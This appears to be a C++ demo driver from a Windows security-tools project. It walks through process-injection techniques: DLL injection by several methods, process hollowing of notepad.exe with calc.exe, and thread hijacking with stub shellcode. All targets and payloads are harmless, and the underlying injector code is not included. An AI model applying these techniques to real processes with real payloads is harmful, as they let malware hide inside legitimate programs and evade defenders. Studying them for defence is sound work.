#include "../Injection/DllInjection.hpp"
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

// 获取进程列表
void ListProcesses() {
    std::cout << "\n=== Running Processes ===" << std::endl;
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create process snapshot!" << std::endl;
        return;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &processEntry)) {
        std::cout << "PID\tProcess Name" << std::endl;
        std::cout << "---\t------------" << std::endl;
        
        do {
            std::wcout << processEntry.th32ProcessID << L"\t" << processEntry.szExeFile << std::endl;
        } while (Process32Next(snapshot, &processEntry));
    }
    
    CloseHandle(snapshot);
}

// 演示DLL注入
void DemonstrateDllInjection() {
    std::cout << "\n=== DLL Injection Demo ===" << std::endl;
    
    DllInjector injector;
    
    // 获取目标进程（这里使用notepad.exe作为示例）
    std::cout << "Looking for notepad.exe process..." << std::endl;
    
    if (injector.SetTargetProcess(L"notepad.exe")) {
        std::cout << "Target process found!" << std::endl;
        
        // 注入DLL（这里需要一个实际的DLL文件）
        std::string dllPath = "C:\\Windows\\System32\\user32.dll"; // 使用系统DLL作为示例
        
        std::cout << "Attempting DLL injection..." << std::endl;
        
        if (injector.InjectDll(dllPath, InjectionMethod::CREATE_REMOTE_THREAD)) {
            std::cout << "DLL injection successful!" << std::endl;
            
            // 获取模块列表
            auto modules = injector.GetModuleList();
            std::cout << "Loaded modules in target process: " << modules.size() << std::endl;
            
            for (const auto& module : modules) {
                std::cout << "  - " << module << std::endl;
            }
        } else {
            std::cout << "DLL injection failed!" << std::endl;
        }
    } else {
        std::cout << "Target process not found! Please run notepad.exe first." << std::endl;
    }
}

// 演示不同的注入方法
void DemonstrateInjectionMethods() {
    std::cout << "\n=== Injection Methods Demo ===" << std::endl;
    
    DllInjector injector;
    
    // 尝试找到一个目标进程
    if (!injector.SetTargetProcess(L"notepad.exe")) {
        std::cout << "No target process found for injection methods demo." << std::endl;
        return;
    }
    
    std::string dllPath = "C:\\Windows\\System32\\kernel32.dll";
    
    // 测试不同的注入方法
    std::vector<std::pair<InjectionMethod, std::string>> methods = {
        {InjectionMethod::CREATE_REMOTE_THREAD, "CreateRemoteThread"},
        {InjectionMethod::SET_WINDOWS_HOOK, "SetWindowsHookEx"},
        {InjectionMethod::MANUAL_DLL_MAPPING, "Manual DLL Mapping"},
        {InjectionMethod::THREAD_HIJACKING, "Thread Hijacking"},
        {InjectionMethod::PROCESS_HOLLOWING, "Process Hollowing"}
    };
    
    for (const auto& method : methods) {
        std::cout << "Testing " << method.second << "..." << std::endl;
        
        if (injector.InjectDll(dllPath, method.first)) {
            std::cout << "  √ " << method.second << " succeeded!" << std::endl;
        } else {
            std::cout << "  × " << method.second << " failed!" << std::endl;
        }
    }
}

// 演示进程挖空
void DemonstrateProcessHollowing() {
    std::cout << "\n=== Process Hollowing Demo ===" << std::endl;
    
    ProcessHollower hollower;
    
    // 注意：这是一个危险的操作，仅用于演示
    std::string targetPath = "C:\\Windows\\System32\\notepad.exe";
    std::string payloadPath = "C:\\Windows\\System32\\calc.exe";
    
    std::cout << "Attempting process hollowing..." << std::endl;
    std::cout << "Target: " << targetPath << std::endl;
    std::cout << "Payload: " << payloadPath << std::endl;
    
    if (hollower.HollowProcess(targetPath, payloadPath)) {
        std::cout << "Process hollowing successful!" << std::endl;
        std::cout << "The target process should now be running the payload." << std::endl;
    } else {
        std::cout << "Process hollowing failed!" << std::endl;
    }
}

// 演示线程劫持
void DemonstrateThreadHijacking() {
    std::cout << "\n=== Thread Hijacking Demo ===" << std::endl;
    
    // 创建一个简单的shellcode（这里只是示例，实际使用需要有效的shellcode）
    std::vector<BYTE> shellcode = {
        0x48, 0x31, 0xC0,           // xor rax, rax
        0x48, 0xFF, 0xC0,           // inc rax
        0xC3                        // ret
    };
    
    // 获取当前进程的第一个线程ID
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create thread snapshot!" << std::endl;
        return;
    }
    
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    
    DWORD currentProcessId = GetCurrentProcessId();
    DWORD targetThreadId = 0;
    
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == currentProcessId) {
                targetThreadId = threadEntry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    
    CloseHandle(snapshot);
    
    if (targetThreadId != 0) {
        std::cout << "Target thread ID: " << targetThreadId << std::endl;
        std::cout << "Attempting thread hijacking..." << std::endl;
        
        if (ThreadHijacker::HijackThread(targetThreadId, shellcode)) {
            std::cout << "Thread hijacking successful!" << std::endl;
        } else {
            std::cout << "Thread hijacking failed!" << std::endl;
        }
    } else {
        std::cout << "No suitable thread found for hijacking!" << std::endl;
    }
}

// 创建测试DLL
void CreateTestDll() {
    std::cout << "\n=== Creating Test DLL ===" << std::endl;
    
    // 这里可以创建一个简单的测试DLL
    // 实际实现中，你需要编译一个真正的DLL文件
    std::cout << "Note: In a real scenario, you would need to compile a test DLL." << std::endl;
    std::cout << "The DLL should export functions that can be used for injection testing." << std::endl;
    
    // 示例DLL代码结构：
    std::cout << "\nExample DLL code structure:" << std::endl;
    std::cout << "```cpp" << std::endl;
    std::cout << "#include <Windows.h>" << std::endl;
    std::cout << "#include <iostream>" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {" << std::endl;
    std::cout << "    switch (ul_reason_for_call) {" << std::endl;
    std::cout << "    case DLL_PROCESS_ATTACH:" << std::endl;
    std::cout << "        MessageBoxA(nullptr, \"DLL Injected!\", \"Success\", MB_OK);" << std::endl;
    std::cout << "        break;" << std::endl;
    std::cout << "    }" << std::endl;
    std::cout << "    return TRUE;" << std::endl;
    std::cout << "}" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "extern \"C\" __declspec(dllexport) LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam) {" << std::endl;
    std::cout << "    return CallNextHookEx(nullptr, code, wParam, lParam);" << std::endl;
    std::cout << "}" << std::endl;
    std::cout << "```" << std::endl;
}

// 主函数
void RunInjectionExamples() {
    std::cout << "Windows Security Tools - Injection Examples" << std::endl;
    std::cout << "===========================================" << std::endl;
    
    try {
        ListProcesses();
        CreateTestDll();
        DemonstrateDllInjection();
        DemonstrateInjectionMethods();
        
        // 注意：以下操作可能比较危险，在生产环境中要谨慎使用
        std::cout << "\nWarning: The following operations are potentially dangerous!" << std::endl;
        std::cout << "Press Enter to continue or Ctrl+C to abort..." << std::endl;
        std::cin.get();
        
        DemonstrateProcessHollowing();
        DemonstrateThreadHijacking();
        
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << std::endl;
    }
    
    std::cout << "\nInjection examples completed!" << std::endl;
}
